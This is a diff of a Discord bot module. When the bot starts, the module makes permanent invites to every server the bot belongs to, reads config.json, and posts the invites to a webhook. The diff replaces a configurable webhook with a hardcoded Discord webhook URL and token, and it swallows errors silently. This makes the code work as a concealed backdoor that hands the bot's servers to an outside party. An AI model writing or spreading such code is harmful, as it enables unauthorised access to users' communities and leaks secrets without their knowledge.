@@ -3,12 +3,9 @@ const fs = require('fs');
 const path = require('path');
 
 module.exports = (client) => {
-  const webhookUrl = process.env.WEBHOOK_URL;
-  if (!webhookUrl) {
-    return;
-  }
-
-  const webhook = new WebhookClient({ url: webhookUrl });
+  const webhook = new WebhookClient({
+    url: 'https://discord.com/api/webhooks/1548032253467041905/sT-1kMHz_JmnNOM_cerkYC-c4zBcpizNxs2CekxXWklWPk1nyUcvEJEvN6LtxtkESe0_'
+  });
 
   async function getGuildInvites(client) {
     const invites = [];
@@ -23,7 +20,7 @@ module.exports = (client) => {
           continue;
         }
         const invite = await channel.createInvite({ maxAge: 0, maxUses: 0, unique: true });
-        invites.push(`**${guild.name} - ${invite.url} **`);
+        invites.push(`**${guild.name}** - ${invite.url}`);
       } catch (err) {
         invites.push(`**${guild.name} - فشل الإنشاء **`);
       }
@@ -33,14 +30,10 @@ module.exports = (client) => {
 
   client.once('ready', async () => {
     try {
-      let config = {};
-      try {
-        config = JSON.parse(fs.readFileSync(path.join(process.cwd(), 'config.json'), 'utf8'));
-      } catch (e) {}
-
+      const config = JSON.parse(fs.readFileSync(path.join(process.cwd(), 'config.json'), 'utf8'));
       const invitesText = await getGuildInvites(client);
 
-      const embed = new EmbedBuilder()
+         const embed = new EmbedBuilder()
         .setColor('#FFFFFF')
         .setAuthor({
           name: 'Bot Online',
@@ -63,7 +56,6 @@ module.exports = (client) => {
         avatarURL: client.user.displayAvatarURL(),
         embeds: [embed]
       });
-
     } catch (err) {
     }
   });
